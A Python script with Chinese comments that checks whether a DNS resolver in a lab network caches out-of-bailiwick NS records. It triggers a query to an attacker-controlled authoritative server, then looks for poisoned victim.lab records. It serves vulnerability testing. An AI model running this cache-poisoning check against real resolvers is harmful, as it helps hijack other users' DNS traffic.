#!/usr/bin/env python3
"""
缓存投毒验证脚本 — Authority NS RDATA Bailiwick Check

自动完成：基线检查 → 触发攻击 → 等待 → 检测投毒 → 二次验证

测试的安全问题：解析器是否对合法响应中 Authority 段的 NS 记录执行 bailiwick check？
如果查询 attacker.lab 的响应中携带了 victim.lab 的 NS 记录，解析器是否会拒绝缓存？

参考: CVE-2025-11411 (Unbound), CVE-2021-25220 (BIND9)
"""

import argparse
import sys
import time

import dns.message
import dns.name
import dns.query
import dns.rdatatype


def query_dns(server: str, port: int, qname: str, rdtype: str, timeout: float = 5.0):
    """发送 DNS 查询并返回完整响应对象"""
    q = dns.message.make_query(qname, rdtype)
    try:
        resp = dns.query.udp(q, server, port=port, timeout=timeout)
        return resp
    except dns.exception.Timeout:
        return None
    except Exception as e:
        print(f"  [查询错误] {e}")
        return None


def extract_answer_ips(resp) -> list:
    """从 Answer 段提取所有 A 记录的 IP"""
    ips = []
    if resp is None:
        return ips
    for rrset in resp.answer:
        if rrset.rdtype == dns.rdatatype.A:
            for rr in rrset:
                ips.append(str(rr))
    return ips


def extract_ns_names(resp) -> list:
    """从 Answer 和 Authority 段提取所有 NS 记录的 NSDNAME"""
    ns_list = []
    if resp is None:
        return ns_list
    for section in [resp.answer, resp.authority]:
        for rrset in section:
            if rrset.rdtype == dns.rdatatype.NS:
                for rr in rrset:
                    ns_list.append((str(rrset.name), str(rr.target)))
    return ns_list


def check_all_sections_for_evil(resp) -> list:
    """在 Answer / Authority / Additional 所有段中搜索恶意记录"""
    evil = []
    if resp is None:
        return evil
    for tag, section in [("ANSWER", resp.answer), ("AUTHORITY", resp.authority), ("ADDITIONAL", resp.additional)]:
        for rrset in section:
            for rr in rrset:
                rr_text = rr.to_text()
                if "evil" in rr_text.lower() or "172.21.0.99" in rr_text:
                    evil.append(f"{tag}: {rrset.name} {dns.rdatatype.to_text(rrset.rdtype)} {rr_text}")
    return evil


def main():
    parser = argparse.ArgumentParser(description="DNS 缓存投毒验证 — Bailiwick Check 测试")
    parser.add_argument("--target-ip", required=True, help="被测解析器 IP")
    parser.add_argument("--target-port", type=int, required=True, help="被测解析器端口")
    parser.add_argument("--target-name", required=True, help="被测软件名称")
    parser.add_argument("--wait", type=float, default=2.0, help="攻击后等待秒数")
    args = parser.parse_args()

    srv = args.target_ip
    port = args.target_port
    name = args.target_name

    print(f"\n{'='*60}")
    print(f"  DNS 缓存投毒测试 — {name}")
    print(f"  目标: {srv}:{port}")
    print(f"  攻击方式: Out-of-bailiwick Authority NS in legitimate response")
    print(f"{'='*60}\n")

    vulnerable = False

    # ── Step 1: 基线检查 ──
    print("[Step 1] 基线: 查询 www.victim.lab A")
    resp = query_dns(srv, port, "www.victim.lab", "A")
    if resp is None:
        print("  → 超时，无响应")
        print("  ✗ 基线检查失败，无法继续测试")
        return False

    ips = extract_answer_ips(resp)
    if "1.2.3.4" in ips:
        print(f"  → {', '.join(ips)} ✓ (正常)")
    else:
        print(f"  → {', '.join(ips) or '无结果'}")
        print("  ⚠ 基线异常（期望 1.2.3.4），可能需要清除缓存后重试")

    # ── Step 2: 触发攻击 ──
    print(f"\n[Step 2] 触发: 查询 test.attacker.lab A")
    print(f"  （该查询将被转发到恶意权威服务器，响应中携带 victim.lab 的恶意 NS）")
    resp = query_dns(srv, port, "test.attacker.lab", "A")
    if resp is None:
        print("  → 超时，恶意服务器可能未启动或路由不通")
        print("  ✗ 无法触发攻击，测试终止")
        return False

    ips = extract_answer_ips(resp)
    print(f"  → Answer: {', '.join(ips) or '无'}")

    evil_in_trigger = check_all_sections_for_evil(resp)
    if evil_in_trigger:
        print(f"  → ⚠ 触发响应中直接包含恶意记录:")
        for e in evil_in_trigger:
            print(f"    {e}")
    else:
        print(f"  → 触发响应中未直接暴露恶意记录（可能已被解析器过滤）")

    # ── Step 3: 等待 ──
    print(f"\n[Step 3] 等待 {args.wait} 秒让缓存生效...")
    time.sleep(args.wait)

    # ── Step 4: 检测 NS 投毒 ──
    print(f"\n[Step 4] 检测: 查询 victim.lab NS")
    resp = query_dns(srv, port, "victim.lab", "NS")
    if resp is None:
        print("  → 超时")
    else:
        ns_records = extract_ns_names(resp)
        if ns_records:
            for owner, target in ns_records:
                marker = " ⚠ OUT-OF-BAILIWICK — 缓存已被投毒!" if "evil" in target.lower() else ""
                print(f"  → {owner} NS {target}{marker}")
                if "evil" in target.lower():
                    vulnerable = True
        else:
            print(f"  → 未返回 NS 记录")

        evil_here = check_all_sections_for_evil(resp)
        for e in evil_here:
            if "evil" in e.lower():
                print(f"  → ⚠ 发现恶意数据: {e}")
                vulnerable = True

    # ── Step 5: 二次验证 ──
    print(f"\n[Step 5] 二次验证: 再次查询 www.victim.lab A")
    resp = query_dns(srv, port, "www.victim.lab", "A")
    if resp is None:
        print("  → 超时（可能因 NS 被劫持到不存在的服务器）")
        if vulnerable:
            print("  → ⚠ 结合 Step 4 结果，这可能是流量被劫持的表现")
    else:
        ips = extract_answer_ips(resp)
        rcode_text = dns.rcode.to_text(resp.rcode())
        print(f"  → {', '.join(ips) or f'无 A 记录 (RCODE={rcode_text})'}")
        if "172.21.0.99" in ips:
            print(f"  → ⚠ 流量被劫持到攻击者 IP!")
            vulnerable = True
        elif "1.2.3.4" in ips:
            print(f"  → ✓ 解析结果正常，未被劫持")
        elif not ips and rcode_text == "SERVFAIL":
            if vulnerable:
                print(f"  → ⚠ SERVFAIL 可能因 NS 被劫持到不可达地址导致")

    # ── 结论 ──
    print(f"\n{'='*60}")
    if vulnerable:
        print(f"  ⚠ 结论: {name} 存在 VULNERABLE")
        print(f"  Authority-NS-RDATA 缓存投毒漏洞已确认!")
        print(f"  解析器未正确执行 bailiwick check，")
        print(f"  缓存了 out-of-bailiwick 的恶意 NS 记录。")
    else:
        print(f"  ✓ 结论: {name} is NOT VULNERABLE")
        print(f"  解析器正确拒绝了 out-of-bailiwick 的 Authority NS 记录。")
    print(f"{'='*60}\n")

    return vulnerable


if __name__ == "__main__":
    result = main()
    sys.exit(1 if result else 0)
